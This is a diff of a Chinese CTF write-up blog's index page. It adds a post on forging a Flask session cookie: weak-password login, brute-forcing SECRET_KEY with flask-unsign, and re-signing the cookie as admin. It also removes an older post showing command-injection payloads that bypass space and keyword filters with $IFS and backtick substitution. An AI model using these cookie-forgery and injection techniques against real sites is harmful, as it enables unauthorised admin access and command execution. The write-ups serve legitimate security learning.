@@ -1791,6 +1791,10 @@
       
         
       
+        
+      
+        
+      
     
     
     
@@ -1838,6 +1842,36 @@
 
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/htaccess/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    .htaccess
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
             
               
                 
@@ -2238,6 +2272,36 @@
   
   
     <li class="md-nav__item">
+      <a href="../../../../category/%E5%9B%BE%E7%89%87%E9%A9%AC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    图片马
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="../../../../category/%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BF%A1%E4%BB%BB/" class="md-nav__link">
         
   
@@ -2525,6 +2589,149 @@
       <header class="md-typeset">
         <h1 id="2026">2026<a class="headerlink" href="#2026" title="Permanent link">&para;</a></h1>
       </header>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-10-24 00:00:00+00:00">2026-10-24</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../../../../category/%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/" class="md-meta__link">新手入门</a>, 
+              <a href="../../../../category/%E4%BC%9A%E8%AF%9D%E5%AE%89%E5%85%A8/" class="md-meta__link">会话安全</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="stage1-flasklogin"><a class="toclink" href="../../../../flasklogin/">Stage1 · FlaskLogin</a></h2>
+<p>这道题强调这是一个用 Flask 做的站点。</p>
+<p><img alt="登录页" src="../../../../../assets/images/flasklogin/01-login.png" /></p>
+<h3 id="_1"><a class="toclink" href="../../../../flasklogin/#_1">登录</a></h3>
+<p>页面提示「<code>guest / 123456</code> 之类的弱口令可能还在」。</p>
+<p>试了 <code>123456</code> 不行，换 <code>guest123</code> 进去了。</p>
+<p>登录后是普通用户空间：</p>
+<p><img alt="普通用户空间" src="../../../../../assets/images/flasklogin/02-guest.png" /></p>
+<p>页面提示：</p>
+<blockquote>
+<p><strong>试试看看你的「身份」是怎么被网站记住的？（F12 → Application → Cookies，那个 session cookie 引起了我的注意）</strong></p>
+</blockquote>
+<div class="admonition note">
+<p class="admonition-title">Firefox 里 Cookie 在哪</p>
+<p><strong>Firefox 的 Cookie 在「存储」(Storage) 面板里，不在「应用程序」里。</strong></p>
+<p>Chrome：Application → Cookies
+Firefox：存储 → Cookie</p>
+</div>
+<h3 id="cookie"><a class="toclink" href="../../../../flasklogin/#cookie">看 Cookie</a></h3>
+<p>看到 <code>session</code> 的值是：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.0due7kkk3LdRwoQPSckRCSMWv88
+</span></code></pre></div>
+<p><strong>注意：只有第一段是 base64，整条不是。</strong></p>
+<p>把第一段 <code>eyJ1c2VyIjoiZ3Vlc3QifQ</code> 拿去 base64 解码：</p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="p">{</span><span class="nt">"user"</span><span class="p">:</span><span class="s2">"guest"</span><span class="p">}</span>
+</span></code></pre></div>
+<p>得到身份就是这一小段 JSON。</p>
+<h3 id="_2"><a class="toclink" href="../../../../flasklogin/#_2">认出格式</a></h3>
+<p>整条值长这样：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>eyJ1c2VyIjoiZ3Vlc3QifQ . atybFQ . 0due7kkk3LdRwoQPSckRCSMWv88
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>└───── 数据 ─────┘    └时间戳┘  └──────── HMAC 签名 ────────┘
+</span></code></pre></div>
+<p><strong>这是 Flask 默认的签名 session 格式：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>base64(JSON) . base64(时间戳) . base64(HMAC-SHA1)
+</span></code></pre></div>
+<p><strong>签名是拿 <code>SECRET_KEY</code> 对整个 <code>数据.时间戳</code> 算出来的。</strong></p>
+<h3 id="user-admin"><a class="toclink" href="../../../../flasklogin/#user-admin">直接改 user 为 admin？不行</a></h3>
+<p><strong>把 <code>{"user":"guest"}</code> 改成 <code>{"user":"admin"}</code> 再 base64 回去，塞进 Cookie —— 会被弹回登录页（302）。</strong></p>
+<p><strong>因为签名是对内容算的，内容一改，签名就对不上，服务端直接判无效。</strong></p>
+<p><strong>所以要改身份，必须先拿到 <code>SECRET_KEY</code>，自己重新签一个。</strong></p>
+<h3 id="secret_key"><a class="toclink" href="../../../../flasklogin/#secret_key">找 SECRET_KEY</a></h3>
+<p>先用 flask 工具爆破字典：</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">pip</span> <span class="n">install</span> <span class="n">flask-unsign</span> <span class="n">-i</span> <span class="n">https</span><span class="p">://</span><span class="n">pypi</span><span class="p">.</span><span class="n">tuna</span><span class="p">.</span><span class="n">tsinghua</span><span class="p">.</span><span class="n">edu</span><span class="p">.</span><span class="n">cn</span><span class="p">/</span><span class="n">simple</span>
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="s1">'secret'</span><span class="p">,</span><span class="s1">'dev'</span><span class="p">,</span><span class="s1">'changeme'</span><span class="p">,</span><span class="s1">'ctf2026'</span> <span class="p">|</span> <span class="nb">Set-Content</span> <span class="n">wl</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-unsign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.0due7kkk3LdRwoQPSckRCSMWv88"</span> <span class="p">-</span><span class="n">-wordlist</span> <span class="n">wl</span><span class="p">.</span><span class="n">txt</span>
+</span></code></pre></div>
+<p><strong>同时注意到页面上的 <code>ctf2026</code>（登录页标题 <code>🔑 ctf2026</code>）—— 拿它当 secret 一试就中。</strong></p>
+<h3 id="_3"><a class="toclink" href="../../../../flasklogin/#_3">重新签名</a></h3>
+<p><img alt="重新签名" src="../../../../../assets/images/flasklogin/03-sign.png" /></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="n">python</span><span class="p">.</span><span class="n">exe</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-sign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"{'user': 'admin'}"</span> <span class="p">-</span><span class="n">-secret</span> <span class="n">ctf2026</span>
+</span></code></pre></div>
+<p><strong>注意 <code>--cookie</code> 用的是 <strong>Python 字典语法</strong>（单引号），不是 JSON。</strong></p>
+<p>输出一条新的：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>eyJ1c2VyIjoiYWRtaW4ifQ.atyPOw.5-D0uOFDLKt18mszGkl5W9CVBGE
+</span></code></pre></div>
+<p><strong>把它整个替换掉 Cookie 里的 <code>session</code> 值，刷新。</strong></p>
+<div class="admonition warning">
+<p class="admonition-title">两个常见坑</p>
+<p><strong>① 密钥别打错</strong>：<code>ctf2026</code> 是 7 个字符，写成 <code>ctf20206</code> 就废了。</p>
+<p><strong>② 替换的是整条</strong>（三段都要），不是只换第一段。</p>
+</div>
+<h3 id="flag"><a class="toclink" href="../../../../flasklogin/#flag">拿到 flag</a></h3>
+<p><img alt="Welcome admin" src="../../../../../assets/images/flasklogin/04-flag.png" /></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>flag{fl4sk_s3ss10n_1s_n07_s3cur3}
+</span></code></pre></div>
+<h3 id="_4"><a class="toclink" href="../../../../flasklogin/#_4">这题的完整链路</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>① 弱口令登录        guest / guest123
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>② 观察 session      eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.xxx
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>③ 解码第一段        {"user":"guest"}
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>④ 认出格式          base64(数据) . 时间戳 . HMAC 签名   ← Flask
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>⑤ 直接改内容        ❌ 302（签名校验失败）
+</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>⑥ 找 SECRET_KEY     页面标题 ctf2026 / flask-unsign 爆破
+</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>⑦ 自己重新签名      flask-unsign --sign --cookie "{'user':'admin'}" --secret ctf2026
+</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a>⑧ 替换整条 Cookie   → 👑 Welcome, admin → flag
+</span></code></pre></div>
+<h3 id="_5"><a class="toclink" href="../../../../flasklogin/#_5">知识点</a></h3>
+<p><strong>这题的核心是区分两件事：</strong></p>
+<table>
+<thead>
+<tr>
+<th>情况</th>
+<th>能不能改</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Cookie 里存<strong>明文身份</strong></td>
+<td>✅ 随便改（和前面米米那题第四关一样）</td>
+</tr>
+<tr>
+<td>Cookie 里存<strong>签名过的身份</strong></td>
+<td>❌ 改了签名就废，除非拿到密钥</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Flask 的 session 属于第二种 —— 默认用 <code>SECRET_KEY</code> 做 HMAC-SHA1 签名。</strong></p>
+<p><strong>所以「Flask 站点 + session cookie」这个组合，标准套路就是：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>先试着解码 → 认出 .时间戳.签名 三段式 → 上 flask-unsign
+</span></code></pre></div>
+<h3 id="_6"><a class="toclink" href="../../../../flasklogin/#_6">工具备忘</a></h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="c"># 只看内容,不需要密钥</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-decode</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"eyJ..."</span>
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="c"># 爆破密钥</span>
+</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-unsign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"eyJ..."</span> <span class="p">-</span><span class="n">-wordlist</span> <span class="n">wl</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>
+</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a><span class="c"># 用已知密钥伪造</span>
+</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-sign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"{'user':'admin'}"</span> <span class="p">-</span><span class="n">-secret</span> <span class="n">ctf2026</span>
+</span></code></pre></div>
+    
+    
+  </div>
+</article>
       
         <article class="md-post md-post--excerpt">
   <header class="md-post__header">
@@ -3666,82 +3873,6 @@
 <p><strong>黑名单是子串匹配时，先找"哪些常用词被连坐"（<code>et</code> 封掉 <code>get</code>/<code>set</code>）。</strong></p>
 <p><strong><code>/</code> 被封不等于走不了 —— <code>cd ..</code> 相对路径一样能爬到根目录。</strong></p>
 <p><strong>读文件命令十几个，封 8 个还剩 8 个；<code>*</code> 被封还有 <code>?</code>。</strong></p>
-</blockquote>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-10-20 00:00:00+00:00">2026-10-20</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="../../../../category/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="md-meta__link">命令注入</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 1 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="ping-ping-ping-flag"><a class="toclink" href="../../../../ping-ping-ping/">[Ping ping ping] 空格被过滤后怎么读 flag</a></h2>
-<p>第一道命令注入题。输入框是 ping 测试。</p>
-<h3 id="_1"><a class="toclink" href="../../../../ping-ping-ping/#_1">现象</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>127.0.0.1;id      → 没反应
-</span></code></pre></div>
-<p><strong>试出空格被过滤。</strong></p>
-<h3 id="_2"><a class="toclink" href="../../../../ping-ping-ping/#_2">绕法</a></h3>
-<p><strong>空格 → <code>$IFS</code></strong></p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="p">;</span>ls<span class="w">          </span>→<span class="w"> </span>看见<span class="w"> </span>flag.php
-</span></code></pre></div>
-<p><strong>但 <code>flag</code> 这个词也被过滤，<code>/</code> 和 <code>/f*</code> 同样被拦。</strong></p>
-<h3 id="_3"><a class="toclink" href="../../../../ping-ping-ping/#_3">关键一步：让系统自己算文件名</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="p">|</span>cat<span class="nv">$IFS</span><span class="sb">`</span>ls<span class="sb">`</span>
-</span></code></pre></div>
-<p><strong>拆开看：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>|            管道
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>cat          要执行的命令
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>$IFS         空格
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>`ls`         命令替换 → 得到 "flag.php"
-</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>             ↓
-</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>最终等价于:  cat flag.php
-</span></code></pre></div>
-<p><strong>拿到了 flag。</strong></p>
-<h3 id="_4"><a class="toclink" href="../../../../ping-ping-ping/#_4">为什么这招有效</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>flag 被拦   →  不写 flag 这个字面量
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>/ 和 /f* 被拦 →  路径里的 / 也不用写
-</span></code></pre></div>
-<p><strong>让系统输出文件名，再用命令替换塞进参数里 —— 你一个字都不用写。</strong></p>
-<h3 id="_5"><a class="toclink" href="../../../../ping-ping-ping/#_5">踩的坑</a></h3>
-<div class="admonition bug">
-<p class="admonition-title">全角 ￥ 不是 $</p>
-<p>中文输入法下容易打成 <code>￥IFS</code>，shell 不认。必须半角 <code>$</code>。</p>
-</div>
-<div class="admonition bug">
-<p class="admonition-title">$IFS 后面紧跟字母会粘连</p>
-<p><code>cat$IFS/flag</code> ✅
-<code>cat$IFSflag</code>  ❌ 变成变量 <code>$IFSflag</code></p>
-</div>
-<h3 id="_6"><a class="toclink" href="../../../../ping-ping-ping/#_6">收获</a></h3>
-<blockquote>
-<p><strong>分隔符有五种（<code>;</code> <code>|</code> <code>||</code> <code>&amp;&amp;</code> <code>%0a</code>），别在 <code>;</code> 上吊死。</strong></p>
-<p><strong>关键词被拦 → 引号拆分、通配符、命令替换。</strong></p>
-<p><strong>路径被拦 → <code>`ls`</code> 让系统自己算 —— 这是最通用的一招。</strong></p>
 </blockquote>
     
     
